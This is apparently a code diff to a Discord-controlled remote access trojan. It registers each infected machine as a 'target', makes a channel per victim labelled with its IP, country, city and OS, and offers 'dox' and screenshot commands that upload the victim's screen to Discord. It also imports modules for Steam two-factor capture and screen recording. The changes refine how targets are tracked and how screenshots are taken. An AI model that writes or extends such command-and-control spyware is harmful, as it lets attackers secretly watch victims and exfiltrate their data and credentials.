@@ -12,6 +12,7 @@ from features.setup import *
 from features.steam2fa import *
 from features.screenRecord import *
 from features.windows import *
+import json
 
 
 __DISCORD_TARGETS_CHANNEL_NAME = "targets"
@@ -39,14 +40,15 @@ def main():
         targets_channel = discord.utils.get(guild.text_channels, name=__DISCORD_TARGETS_CHANNEL_NAME)
         targets_channel_msgs = await targets_channel.history().flatten()
         targets = list(map(lambda target_channel_msg: target_channel_msg.content, targets_channel_msgs))
+        targets_identifiers = list(map(lambda target: json.loads(target)['identifier'], targets))
 
-        if identifier not in targets:
-            await targets_channel.send(identifier)
+        if identifier not in targets_identifiers:
             channel_name = await guild.create_text_channel(identifier)
+            await targets_channel.send(json.dumps({'identifier': identifier, 'channel_id': channel_name.id}))
             print(f"Created new channel: {channel_name}")
             channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
             c2 = bot.get_channel(channel_id.id)
-            await c2.edit(topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {os}")
+            await c2.edit(topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()}")
 
     @bot.command()
     async def dox(ctx):
@@ -73,7 +75,7 @@ def main():
         if ctx.channel.name != generate_uuid():
             return
             
-        screen_path = screenshot()
+        screen_path = await screenshot()
         await ctx.send(file=discord.File(screen_path))
         os.remove(screen_path)
 
